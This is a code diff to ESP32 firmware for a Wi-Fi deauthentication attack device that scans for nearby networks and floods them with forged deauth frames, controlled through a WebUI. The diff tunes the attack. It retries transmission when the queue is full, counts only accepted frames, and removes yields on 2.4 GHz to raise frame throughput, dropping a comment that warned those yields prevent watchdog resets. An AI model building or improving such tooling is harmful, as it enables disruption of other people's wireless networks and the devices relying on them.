@@ -157,7 +157,7 @@ static const uint8_t num_reasons = sizeof(deauth_reasons) / sizeof(deauth_reason
 //   NO_TARGETS   : yellow slow blink — scan complete, nothing strong enough, retrying
 //   TARGETS_FOUND: solid green       — targets locked, attack about to start
 //   ATTACKING    : red breathing     — deauth burst loop running
-//   WEBUI_IDLE   : solid orange      — SoftAP up, WebUI awaiting commands
+//   WEBUI_IDLE   : rainbow breath    — SoftAP up, WebUI awaiting commands
 typedef enum {
     LED_STATE_BOOT = 0,
     LED_STATE_WIFI_INIT,
@@ -629,7 +629,8 @@ static void reboot_into(uint32_t mode) {
 }
 
 // ==================== Deauth ====================
-static void send_deauth_frame(const uint8_t *ap_mac, uint16_t reason) {
+// Returns true when the frame was accepted by the Wi-Fi driver.
+static bool send_deauth_frame(const uint8_t *ap_mac, uint16_t reason) {
     static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     static uint16_t seq_num = 0;
 
@@ -649,12 +650,19 @@ static void send_deauth_frame(const uint8_t *ap_mac, uint16_t reason) {
     frame.reason[0] = reason & 0xFF;
     frame.reason[1] = (reason >> 8) & 0xFF;
 
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
-    if (err != ESP_OK) {
+    for (int attempt = 0; attempt < 4; attempt++) {
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
+        if (err == ESP_OK) return true;
+        if (err == ESP_ERR_NO_MEM) {
+            vTaskDelay(pdMS_TO_TICKS(2));   // let the TX queue drain
+            continue;
+        }
         static uint32_t tx_fail_count;
         if ((++tx_fail_count % 256) == 1)
             ESP_LOGW(TAG, "esp_wifi_80211_tx failed: %s (suppressing repeats)", esp_err_to_name(err));
+        return false;
     }
+    return false;
 }
 
 // Attack all targets in one band's target list, iterating by channel
@@ -684,12 +692,12 @@ static void attack_band(target_list_t *list, uint8_t burst_size, bool is_5ghz) {
             if (!target->active || target->channel != channels[c]) continue;
 
             for (int i = 0; i < burst_size; i++) {
-                send_deauth_frame(target->bssid, deauth_reasons[i % num_reasons]);
-                target->packets_sent++;
+                if (send_deauth_frame(target->bssid, deauth_reasons[i % num_reasons]))
+                    target->packets_sent++;
 
-                // Yield on both bands so long bursts cannot starve the idle task
-                // and trip the task watchdog (CONFIG_ESP_TASK_WDT_TIMEOUT_S=5).
-                if (i % 8 == 7)
+                // Yield on 5 GHz only — 2.4 GHz runs tight; extra delays there
+                // starve throughput without helping the TX queue on this chip.
+                if (i % 8 == 7 && is_5ghz)
                     vTaskDelay(pdMS_TO_TICKS(1));
             }
             vTaskDelay(pdMS_TO_TICKS(TARGET_BURST_DELAY_MS));
@@ -871,6 +879,7 @@ static uint16_t scan_and_filter_targets(void) {
     ESP_LOGI(TAG, "Scanning for networks...");
     if (esp_wifi_scan_start(&scan_config, true) != ESP_OK) {
         ESP_LOGE(TAG, "Scan failed");
+        led_state = LED_STATE_NO_TARGETS;
         return 0;
     }
 
@@ -968,6 +977,7 @@ static uint16_t scan_selected_targets(void) {
     ESP_LOGI(TAG, "Scanning for WebUI-selected target(s)...");
     if (esp_wifi_scan_start(&scan_config, true) != ESP_OK) {
         ESP_LOGE(TAG, "Scan failed");
+        led_state = LED_STATE_NO_TARGETS;
         return 0;
     }
 
@@ -1723,8 +1733,11 @@ static void wifi_init_apsta_webui(void) {
         },
     };
     // SSID and channel come from user settings (NVS), applied at boot.
-    strncpy((char *)ap_config.ap.ssid, g_settings.ap_ssid, sizeof(ap_config.ap.ssid) - 1);
-    ap_config.ap.ssid_len = strlen((char *)ap_config.ap.ssid);
+    size_t ssid_len = strnlen(g_settings.ap_ssid, sizeof(g_settings.ap_ssid));
+    if (ssid_len >= sizeof(ap_config.ap.ssid)) ssid_len = sizeof(ap_config.ap.ssid) - 1;
+    memcpy(ap_config.ap.ssid, g_settings.ap_ssid, ssid_len);
+    ap_config.ap.ssid[ssid_len] = '\0';
+    ap_config.ap.ssid_len = ssid_len;
     ap_config.ap.channel  = g_settings.ap_channel;
     wifi_check(esp_wifi_set_config(WIFI_IF_AP, &ap_config), "esp_wifi_set_config(AP)");
     wifi_check(esp_wifi_start(), "esp_wifi_start");
@@ -2009,7 +2022,7 @@ void app_main(void) {
         xTaskCreate(display_task, "display", 4096, NULL, 2, NULL);
 
         wifi_init_apsta_webui();
-        led_state = LED_STATE_WEBUI_IDLE;             // solid orange
+        led_state = LED_STATE_WEBUI_IDLE;             // rainbow breath
         http_server_start();
         mdns_webui_start();                           // http://wifuxx.local
         xTaskCreate(webui_button_task, "webui_btn", 2048, NULL, 3, NULL);  // hold BOOT 10s = factory reset
